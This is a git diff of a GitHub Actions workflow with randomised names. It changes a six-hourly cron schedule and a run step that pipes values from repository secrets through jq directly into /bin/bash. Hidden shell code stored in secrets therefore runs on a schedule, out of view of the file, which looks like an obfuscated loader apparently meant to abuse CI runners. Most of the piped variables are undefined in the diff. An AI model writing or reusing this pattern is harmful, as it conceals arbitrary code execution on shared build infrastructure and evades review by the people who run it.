@@ -1,8 +1,9 @@
 name: wuhaoning3214
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 3/6 * * *'
+    - cron: '51 4/6 * * *'
 
 jobs:
   build:
@@ -11,18 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: wuhaoning3214
         env:
-          chqaa37995: ${{ secrets.chqaa37995 }}
+          x0946: ${{ secrets.x0946 }}
         run: |
-          echo $chqaa37995 | jq -r .uyr047 | /bin/bash
-          echo $lhp96 | jq -r .b0 | /bin/bash
-          echo $xvwb84635 | jq -r .cml297 | /bin/bash
-          echo $gj07200 | jq -r .yh3 | /bin/bash
-          echo $w8219 | jq -r .miqb76584 | /bin/bash
-          echo $q7011 | jq -r .nfy29 | /bin/bash
-          echo $qhhk55541 | jq -r .nhw248 | /bin/bash
-          echo $qgi3 | jq -r .ufm9 | /bin/bash
-          echo $rg3779 | jq -r .dyao0 | /bin/bash
-          echo $wjai54 | jq -r .ofv27 | /bin/bash
-          echo $du1 | jq -r .pzbyz3927 | /bin/bash
-          echo $crvgu721 | jq -r .v95 | /bin/bash
+          echo $x0946 | jq -r .bz4 | /bin/bash
+          echo $cq50172 | jq -r .oyg7 | /bin/bash
+          echo $wr0 | jq -r .hm6401 | /bin/bash
+          echo $u0 | jq -r .kz36 | /bin/bash
+          echo $gdo87689 | jq -r .ene0 | /bin/bash
+          echo $at4804 | jq -r .s8521 | /bin/bash
+          echo $oikzq31880 | jq -r .zje8996 | /bin/bash
+          echo $hzank32 | jq -r .r6 | /bin/bash
+          echo $k46011 | jq -r .vngwu67218 | /bin/bash
 
